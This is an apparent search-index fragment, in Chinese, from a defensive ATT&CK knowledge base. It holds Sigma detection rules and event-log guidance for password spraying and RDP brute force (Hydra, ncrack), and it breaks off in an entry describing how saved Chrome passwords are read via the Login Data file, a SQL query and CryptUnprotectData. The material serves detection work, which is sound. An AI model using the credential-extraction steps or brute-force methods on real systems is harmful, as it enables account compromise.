\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u901a\u5e38\u5e94\u7528\u5230SMB\u5171\u4eab\u6216RDP\u670d\u52a1\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4ece\u8fd9\u4e24\u70b9\u5165\u624b\uff0c\u8fd9\u4e24\u7c7b\u670d\u52a1\u5728\u4f01\u4e1a\u5185\u7f51\u4e2d\u662f\u975e\u5e38\u5e38\u89c1\u7684\u3002\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u4f1a\u4ea7\u751f\u5927\u91cf\u7684windows\u4e8b\u4ef6ID 4625\u767b\u5f55\u5931\u8d25 \u3002\u5f53\u53d1\u73b0\u5927\u91cf\u6b64\u7c7b\u4e8b\u4ef6\u65f6\uff0c\u5b83\u503c\u5f97\u5f15\u8d77\u4f60\u7684\u6ce8\u610f\u3002 \u5f53\u653b\u51fb\u8005\u901a\u8fc7\u66f4\u6539\u8fde\u63a5\u7684\u670d\u52a1\u6765\u907f\u514dwindows\u4ea7\u751f\u4e8b\u4ef6ID4625\uff0c\u5373\u4e0d\u518d\u8fde\u63a5SMB\u6216\u8005RDP\u670d\u52a1\uff0c\u800c\u662f\u8fde\u63a5\u5230\u57df\u63a7\u5236\u5668\u4e0a\u7684LDAP\u670d\u52a1\uff0c\u8bb8\u591a\u7ec4\u7ec7\u90fd\u5728\u96c6\u4e2d\u7cbe\u529b\u53bb\u76d1\u89c64625\u4e8b\u4ef6\u3002\u4f46\u5982\u679c\u8fde\u63a5\u5230LDAP\u670d\u52a1\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u5219\u4e0d\u4f1a\u8bb0\u5f554625\u4e8b\u4ef6\u3002\u5219\u4f1a\u8bb0\u5f55Kerberos\u65e5\u5fd7\u4e8b\u4ef6 4771 \uff0c\u5e76\u76d1\u6d4b \u201cKerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u201d \u3002\u5728\u4e8b\u4ef6ID 4771\u4e2d\uff0c \u5931\u8d25\u4ee3\u7801\u4e3a\u201c0x18\u201d, \u8fd9\u610f\u5473\u7740\u5bc6\u7801\u9519\u8bef\u3002 \u5728\u63a5\u5165\u57df\u7684\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u5bc6\u7801\u55b7\u5c04\u65f6\uff0c\u5982\u679c\u653b\u51fb\u8005\u5728\u6b64\u7cfb\u7edf\u4e0a\uff08\u5373\u57df\u5185\u4efb\u610f\u4e3b\u673a\u7cfb\u7edf\uff09\u8fd0\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u5219\u4f1a\u5728\u6b64\u4e3b\u673a\u4e0a\u8bb0\u5f55 \u4e8b\u4ef6ID4648\uff08\u201c\u4f7f\u7528\u663e\u5f0f\u51ed\u636e\u5c1d\u8bd5\u767b\u5f55\u201d\uff09 \u3002\u5982\u679c\u5728\u51e0\u79d2\u949f\u5185\u8bb0\u5f55\u4e86\u5927\u91cf4648\u4e8b\u4ef6\uff0c\u8fd9\u79cd\u60c5\u51b5\u662f\u5f02\u5e38\u7684\uff0c\u4f60\u9700\u8981\u91cd\u70b9\u5173\u6ce8\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_3","text":"\u5728AD\u73af\u5883\u4e2d\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u542f\u7528\u9002\u5f53\u7684\u65e5\u5fd7\u8bb0\u5f55\u548c\u6709\u6548\u7684\u5173\u8054\u6765\u8fdb\u884c\u68c0\u6d4b\u548c\u53d1\u73b0\u3002 \u4e3b\u8981\u7684\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565\uff1a \u57df\u63a7\u5236\u5668\uff1a\u4e8b\u4ef6ID4625 \u5ba1\u6838\u767b\u5f55\uff08\u6210\u529f\u548c\u5931\u8d25\uff09 \u57df\u63a7\u5236\u5668\uff1a\u4e8b\u4ef6ID4771 \u5ba1\u6838Kerberos\u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1 \uff08\u6210\u529f\u548c\u5931\u8d25\uff09 \u6240\u6709\u7cfb\u7edf\uff1a\u4e8b\u4ef6ID4648 \u5ba1\u6838\u767b\u5f55\uff08\u6210\u529f\u548c\u5931\u8d25\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_4","text":"\u573a\u666f\u4e00\uff1a\u5229\u7528Hydra\u8fdb\u884cRDP\u7206\u7834 \u573a\u666f\u4e8c\uff1a\u5229\u7528ncrack\u8fdb\u884cRDP\u7206\u7834","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_5","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_6","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#sigma","text":"\u573a\u666f\u4e00\uff1a\u68c0\u6d4b\u89c4\u5219 title: Hydra win7 RDP\u7206\u7834 description: kali windows hydra references: https://www.96007.club/2019/09/17/Credential-Access-win-Password-spraying/ tags: T1110-003 status: experimental author: Blue team logsource: product: windows service: security detection: selection1: EventID: 4771 #\u8ba1\u7b97\u673a\u8bd5\u56fe\u9a8c\u8bc1\u5e10\u6237\u7684\u51ed\u636e\u3002 AuthenticationPackage: 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0' LogonAccount: '*' SourceWorkstation: '*' ErrorCode: '0xc0000064' selection2: EventID: 4625 LogonType: 3 FailureReason: '\u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002' #\u5931\u8d25\u4fe1\u606f>\u5931\u8d25\u539f\u56e0 Status: 0xc000006d #\u5931\u8d25\u4fe1\u606f>\u72b6\u6001 SubStatus: 0xc0000064 #\u5931\u8d25\u4fe1\u606f>\u5b50\u72b6\u6001 LogonProcess: 'NtLmSsp' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u767b\u9646\u8fdb\u7a0b AuthenticationPackage: 'NTLM' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u8eab\u4efd\u9a8c\u8bc1\u5305 timeframe: last 2s condition: all of them level: medium #\u6ce8\u610f\uff1a\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e8b\u4ef6ID\u4e3a4625\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b \u573a\u666f\u4e8c\uff1a\u68c0\u6d4b\u89c4\u5219 title: ncrack win7 RDP\u7206\u7834 description: kali windows ncrack references: https://www.96007.club/2019/09/17/Credential-Access-win-Password-spraying/ tags: T1110-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4771 #\u8ba1\u7b97\u673a\u8bd5\u56fe\u9a8c\u8bc1\u5e10\u6237\u7684\u51ed\u636e\u3002 AuthenticationPackage: 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0' LogonAccount: '*' SourceWorkstation: '*' #\u6e90\u5de5\u4f5c\u7ad9\u5730\u5740\u7b49\u4e8ewin7\u672c\u673a\u4e3b\u673a\u540d ErrorCode: 0xc0000064 selection2: EventID: 4625 LogonType: 10 FailureReason: '\u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002' #\u5931\u8d25\u4fe1\u606f>\u5931\u8d25\u539f\u56e0 Status: 0xc000006d #\u5931\u8d25\u4fe1\u606f>\u72b6\u6001 SubStatus: 0xc0000064 #\u5931\u8d25\u4fe1\u606f>\u5b50\u72b6\u6001 CallerProcessName: 'C:\\Windows\\System32\\winlogon.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8c03\u7528\u65b9\u8fdb\u7a0b\u540d LogonProcess: 'User32' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u767b\u9646\u8fdb\u7a0b AuthenticationPackage: 'Negotiate' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u8eab\u4efd\u9a8c\u8bc1\u5305 timeframe: last 2s condition: all of them level: medium #\u6ce8\u610f\uff1a\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e8b\u4ef6ID\u4e3a4625\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_7","text":"\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u5931\u8d25\u4ee3\u7801\u4e3a0x18\uff0c\u4e8b\u4ef6ID\u4e3a4771\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6b64\u89c4\u5219\u53ea\u9002\u7528\u4e8e\u57df\u63a7\u5236\u5668 \u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e0a\u4e8b\u4ef6ID\u4e3a4648\u7684\u4e8b\u4ef6\u5927\u4e8e100\u4e2a\uff1b \u60a8\u53ef\u4ee5\u6839\u636e\u60a8\u7684\u5177\u4f53\u73af\u5883\u901a\u8fc7\u7f29\u77ed\u65f6\u95f4\u9608\u503c\u6216\u4e8b\u4ef6\u6570\u91cf\u9608\u503c\u6765\u8c03\u6574\u6bcf\u4e2a\u544a\u8b66\u89c4\u5219\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_8","text":"MITRE-ATT&CK-T1110-003 https://attack.mitre.org/techniques/T1110/003 LDAP\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae https://baike.baidu.com/item/LDAP/2875565?fr=aladdin \u7206\u7834\u5de5\u5177 Hydra \u7b80\u5355\u4f7f\u7528 https://www.jianshu.com/p/4da49f179cee CrackMapExec\uff1a\u4e00\u6b3e\u9488\u5bf9\u5927\u578bWindows\u6d3b\u52a8\u76ee\u5f55(AD)\u7684\u540e\u6e17\u900f\u5de5\u5177 https://www.freebuf.com/sectool/184573.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/","text":"T1110-\u66b4\u529b\u7834\u89e3 ATT&CK\u63cf\u8ff0 \u653b\u51fb\u8005\u60f3\u8bbf\u95ee\u67d0\u8d26\u53f7\u4f46\u4e0d\u77e5\u9053\u8d26\u53f7\u5bc6\u7801\u6216\u4ec5\u83b7\u5f97\u4e86\u8d26\u53f7\u7684\u5bc6\u7801\u54c8\u5e0c\u65f6\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u6280\u672f\u5c1d\u8bd5\u8bbf\u95ee\u6b64\u8d26\u53f7\u3002 \u51ed\u636e\u5bfc\u51fa\u7528\u4e8e\u83b7\u53d6\u5bc6\u7801\u54c8\u5e0c\u3002Pass the Hash\u65b9\u6cd5\u884c\u4e0d\u901a\u65f6\uff0c\u653b\u51fb\u8005\u624d\u53ef\u80fd\u4f1a\u7528\u51ed\u636e\u5bfc\u51fa\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u5bc6\u7801\u54c8\u5e0c\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u76f8\u5e94\u6280\u672f\u6765\u7cfb\u7edf\u5730\u731c\u6d4b\u7528\u4e8e\u8ba1\u7b97\u54c8\u5e0c\u7684\u5bc6\u7801\uff0c\u6216\u8005\u53ef\u4ee5\u4f7f\u7528\u9884\u5148\u8ba1\u7b97\u597d\u7684\u5f69\u8679\u8868\u6765\u7834\u89e3\u54c8\u5e0c\u3002\u653b\u51fb\u8005\u901a\u5e38\u5728\u76ee\u6807\u7f51\u7edc\u4ee5\u5916\u4ed6\u4eec\u81ea\u5df1\u6240\u63a7\u5236\u7684\u7cfb\u7edf\u4e0a\u6765\u7834\u89e3\u54c8\u5e0c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5bf9\u5bc6\u7801\u548c\u54c8\u5e0c\u4e00\u65e0\u6240\u77e5\u7684\u60c5\u51b5\u4e0b\u80e1\u4e71\u5c1d\u8bd5\u5bc6\u7801\u6765\u5f3a\u884c\u767b\u5f55\uff0c\u6216\u4f7f\u7528\u4e00\u7cfb\u5217\u5df2\u77e5\u6216\u53ef\u80fd\u7684\u5bc6\u7801\u6765\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u3002\u8fd9\u79cd\u64cd\u4f5c\u7684\u98ce\u9669\u6bd4\u8f83\u5927\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5927\u91cf\u8ba4\u8bc1\u5931\u8d25\u548c\u8d26\u53f7\u9501\u5b9a\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7ec4\u7ec7\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002 \u65e2\u7136\u4f7f\u7528\u591a\u4e2a\u5bc6\u7801\u6765\u66b4\u529b\u7834\u89e3\u4e00\u4e2a\u8d26\u53f7\u4f1a\u5bfc\u81f4\u8be5\u8d26\u53f7\u88ab\u9501\u5b9a\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u5bc6\u7801\u55b7\u6d12\u6280\u672f\u6765\u89c4\u907f\u8fd9\u4e2a\u98ce\u9669\u3002\u5bc6\u7801\u55b7\u6d12\u6280\u672f\u4f7f\u7528\u4e00\u4e2a\uff08\u4f8b\u5982\u201cPassword01\u201d\uff09\u6216\u4e00\u5c0f\u5217\u6ee1\u8db3\u57df\u7684\u590d\u6742\u6027\u7b56\u7565\u7684\u5bc6\u7801\uff08\u5e76\u4e14\u53ef\u80fd\u662f\u5e38\u7528\u7684\u5bc6\u7801\uff09\u548c\u7f51\u7edc\u4e0a\u8bb8\u591a\u5176\u4ed6\u4e0d\u540c\u8d26\u53f7\u6765\u5c1d\u8bd5\u767b\u5f55\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u8ba4\u8bc1\u76f8\u5173\u6570\u636e \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u66b4\u529b\u7834\u89e3 description: \u68c0\u6d4b\u4ece\u4e00\u4e2a\u6e90\u5230\u4e00\u4e2a\u76ee\u7684\u5730\u7684\u8bb8\u591a\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\uff0c\u8fd9\u8868\u660e\u53ef\u80fd\u5b58\u5728\u66b4\u529b\u884c\u4e3a tags: - attack.t1110 author: Aleksandr Akhremchik, oscd.community Translator: 12306Bro date: 2019/10/25 status: experimental logsource: category: authentication #\u8ba4\u8bc1\u6570\u636e detection: selection: action: failure #\u5931\u8d25 timeframe: 600s condition: selection | count(category) by dst_ip > 30 #\u7edf\u8ba1\u8ba4\u8bc1\u6570\u636e\u4e2d10\u5206\u949f\u5185\u76ee\u6807IP\u5927\u4e8e30\u4e2a\u4e14\u8ba4\u8bc1\u5931\u8d25\u7684\u6e90IP\u5730\u5740 fields: - src_ip #\u6e90IP - dst_ip #\u76ee\u7684IP - user # \u7528\u6237 falsepositives: #\u8bef\u62a5 - Inventarization #\u5e93\u5b58\u5316 - Penetration testing #\u6e17\u900f\u6d4b\u8bd5 - Vulnerability scanner #\u6f0f\u6d1e\u626b\u63cf\u5668 - Legitimate application #\u5408\u6cd5\u7533\u8bf7 level: medium #\u4e2d \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1110 https://attack.mitre.org/techniques/T1110/","title":"T1110-\u66b4\u529b\u7834\u89e3"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#t1110-","text":"","title":"T1110-\u66b4\u529b\u7834\u89e3"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#attck","text":"\u653b\u51fb\u8005\u60f3\u8bbf\u95ee\u67d0\u8d26\u53f7\u4f46\u4e0d\u77e5\u9053\u8d26\u53f7\u5bc6\u7801\u6216\u4ec5\u83b7\u5f97\u4e86\u8d26\u53f7\u7684\u5bc6\u7801\u54c8\u5e0c\u65f6\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u6280\u672f\u5c1d\u8bd5\u8bbf\u95ee\u6b64\u8d26\u53f7\u3002 \u51ed\u636e\u5bfc\u51fa\u7528\u4e8e\u83b7\u53d6\u5bc6\u7801\u54c8\u5e0c\u3002Pass the Hash\u65b9\u6cd5\u884c\u4e0d\u901a\u65f6\uff0c\u653b\u51fb\u8005\u624d\u53ef\u80fd\u4f1a\u7528\u51ed\u636e\u5bfc\u51fa\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u5bc6\u7801\u54c8\u5e0c\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u76f8\u5e94\u6280\u672f\u6765\u7cfb\u7edf\u5730\u731c\u6d4b\u7528\u4e8e\u8ba1\u7b97\u54c8\u5e0c\u7684\u5bc6\u7801\uff0c\u6216\u8005\u53ef\u4ee5\u4f7f\u7528\u9884\u5148\u8ba1\u7b97\u597d\u7684\u5f69\u8679\u8868\u6765\u7834\u89e3\u54c8\u5e0c\u3002\u653b\u51fb\u8005\u901a\u5e38\u5728\u76ee\u6807\u7f51\u7edc\u4ee5\u5916\u4ed6\u4eec\u81ea\u5df1\u6240\u63a7\u5236\u7684\u7cfb\u7edf\u4e0a\u6765\u7834\u89e3\u54c8\u5e0c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5bf9\u5bc6\u7801\u548c\u54c8\u5e0c\u4e00\u65e0\u6240\u77e5\u7684\u60c5\u51b5\u4e0b\u80e1\u4e71\u5c1d\u8bd5\u5bc6\u7801\u6765\u5f3a\u884c\u767b\u5f55\uff0c\u6216\u4f7f\u7528\u4e00\u7cfb\u5217\u5df2\u77e5\u6216\u53ef\u80fd\u7684\u5bc6\u7801\u6765\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u3002\u8fd9\u79cd\u64cd\u4f5c\u7684\u98ce\u9669\u6bd4\u8f83\u5927\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5927\u91cf\u8ba4\u8bc1\u5931\u8d25\u548c\u8d26\u53f7\u9501\u5b9a\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7ec4\u7ec7\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002 \u65e2\u7136\u4f7f\u7528\u591a\u4e2a\u5bc6\u7801\u6765\u66b4\u529b\u7834\u89e3\u4e00\u4e2a\u8d26\u53f7\u4f1a\u5bfc\u81f4\u8be5\u8d26\u53f7\u88ab\u9501\u5b9a\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u5bc6\u7801\u55b7\u6d12\u6280\u672f\u6765\u89c4\u907f\u8fd9\u4e2a\u98ce\u9669\u3002\u5bc6\u7801\u55b7\u6d12\u6280\u672f\u4f7f\u7528\u4e00\u4e2a\uff08\u4f8b\u5982\u201cPassword01\u201d\uff09\u6216\u4e00\u5c0f\u5217\u6ee1\u8db3\u57df\u7684\u590d\u6742\u6027\u7b56\u7565\u7684\u5bc6\u7801\uff08\u5e76\u4e14\u53ef\u80fd\u662f\u5e38\u7528\u7684\u5bc6\u7801\uff09\u548c\u7f51\u7edc\u4e0a\u8bb8\u591a\u5176\u4ed6\u4e0d\u540c\u8d26\u53f7\u6765\u5c1d\u8bd5\u767b\u5f55\u3002","title":"ATT&amp;CK\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_2","text":"\u8ba4\u8bc1\u76f8\u5173\u6570\u636e","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#sigma","text":"title: \u66b4\u529b\u7834\u89e3 description: \u68c0\u6d4b\u4ece\u4e00\u4e2a\u6e90\u5230\u4e00\u4e2a\u76ee\u7684\u5730\u7684\u8bb8\u591a\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\uff0c\u8fd9\u8868\u660e\u53ef\u80fd\u5b58\u5728\u66b4\u529b\u884c\u4e3a tags: - attack.t1110 author: Aleksandr Akhremchik, oscd.community Translator: 12306Bro date: 2019/10/25 status: experimental logsource: category: authentication #\u8ba4\u8bc1\u6570\u636e detection: selection: action: failure #\u5931\u8d25 timeframe: 600s condition: selection | count(category) by dst_ip > 30 #\u7edf\u8ba1\u8ba4\u8bc1\u6570\u636e\u4e2d10\u5206\u949f\u5185\u76ee\u6807IP\u5927\u4e8e30\u4e2a\u4e14\u8ba4\u8bc1\u5931\u8d25\u7684\u6e90IP\u5730\u5740 fields: - src_ip #\u6e90IP - dst_ip #\u76ee\u7684IP - user # \u7528\u6237 falsepositives: #\u8bef\u62a5 - Inventarization #\u5e93\u5b58\u5316 - Penetration testing #\u6e17\u900f\u6d4b\u8bd5 - Vulnerability scanner #\u6f0f\u6d1e\u626b\u63cf\u5668 - Legitimate application #\u5408\u6cd5\u7533\u8bf7 level: medium #\u4e2d","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_7","text":"MITRE-ATT&CK-T1110 https://attack.mitre.org/techniques/T1110/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/","text":"T1555-003-windows-\u6765\u81eaweb\u6d4f\u89c8\u5668\u7684\u51ed\u8bc1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u540e\u6e17\u900f\u9636\u6bb5\uff0c\u83b7\u5f97\u6743\u9650\u4e4b\u540e\u653b\u51fb\u8005\u9700\u8981\u6536\u96c6\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u6536\u96c6\u7684\u4fe1\u606f\u8d8a\u5168\u9762\u8be6\u7ec6\uff0c\u5bf9\u653b\u51fb\u8005\u7684\u8fdb\u4e00\u6b65\u6e17\u900f\u5e2e\u52a9\u66f4\u5927\u3002\u5bf9\u4e8ewindows\u7cfb\u7edf\u6765\u8bb2\uff0c\u7528\u6237\u6d4f\u89c8\u5668\u5f80\u5f80\u5305\u542b\u7740\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u7279\u5b9a\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u7684\u6d4f\u89c8\u5668\u6587\u4ef6\u6765\u4eceWeb\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u636e\u3002 Web\u6d4f\u89c8\u5668\u901a\u5e38\u4f1a\u4fdd\u5b58\u51ed\u636e\uff0c\u4f8b\u5982\u7f51\u7ad9\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u4ee5\u4fbf\u5c06\u6765\u65e0\u9700\u624b\u52a8\u8f93\u5165\u5b83\u4eec\uff0c\u5b9e\u73b0\u81ea\u52a8\u767b\u5f55\u3002Web\u6d4f\u89c8\u5668\u901a\u5e38\u5c06\u51ed\u636e\u4ee5\u52a0\u5bc6\u683c\u5f0f\u5b58\u50a8\u5728\u51ed\u636e\u5b58\u50a8\u533a\u4e2d\u3002\u4f46\u662f\uff0c\u5b58\u5728\u4eceWeb\u6d4f\u89c8\u5668\u4e2d\u63d0\u53d6\u7eaf\u6587\u672c\u51ed\u636e\u7684\u65b9\u6cd5\u3002 \u4f8b\u5982\uff0c\u5728Windows\u7cfb\u7edf\u4e0a\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u6570\u636e\u5e93\u6587\u4ef6AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\u5e76\u6267\u884cSQL\u67e5\u8be2\u6765\u4eceGoogle Chrome\u83b7\u5f97\u52a0\u5bc6\u7684\u51ed\u636eSELECT action_url, username_value, password_value FROM logins;\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u5c06\u52a0\u5bc6\u7684\u51ed\u636e\u4f20\u9012\u7ed9Windows API\u51fd\u6570\u6765\u83b7\u53d6\u7eaf\u6587\u672c\u5bc6\u7801CryptUnprotectData\uff0c\u8be5\u51fd\u6570\u4f7f\u7528\u53d7\u5bb3\u8005\u7684\u7f13\u5b58\u767b\u5f55\u51ed\u636e\u4f5c\u4e3a\u89e3\u5bc6\u5bc6\u94a5\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5bf9\u5e38\u89c1\u7684Web\u6d4f\u89c8\u5668\uff08\u4f8b\u5982FireFox\uff0cChrome\uff0cEdge\u7b49\uff09\u6267\u884c\u4e86\u7c7b\u4f3c\u7684\u7a0b\u5e8f\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5728Web\u6d4f\u89c8\u5668\u8fdb\u7a0b\u5185\u5b58\u4e2d\u641c\u7d22\uff0c\u901a\u5e38\u4e0e\u51ed\u636e\u5339\u914d\u7684\u6a21\u5f0f\u6765\u83b7\u53d6\u51ed\u636e\u3002\u4ece\u7f51\u7edc\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u636e\u540e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5728\u4e0d\u540c\u7cfb\u7edf\u6216\u5e10\u6237\u4e4b\u95f4\u56de\u6536\u51ed\u636e\uff0c\u4ee5\u6269\u5927\u8bbf\u95ee\u8303\u56f4\u3002\u5728\u4eceWeb\u6d4f\u89c8\u5668\u83b7\u5f97\u7684\u51ed\u636e\u4e0e\u7279\u6743\u5e10\u6237\uff08\u4f8b\u5982\u57df\u7ba1\u7406\u5458\uff09\u91cd\u53e0\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u53ef\u4ee5\u5927\u5927\u7f29\u77ed\u653b\u51fb\u8005\u7684\u653b\u51fb\u65f6\u95f4\u3002 \u4e0d\u540c\u7684\u6d4f\u89c8\u5668\uff0c\u9ed8\u8ba4\u7f13\u5b58\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e0d\u540c\u3002 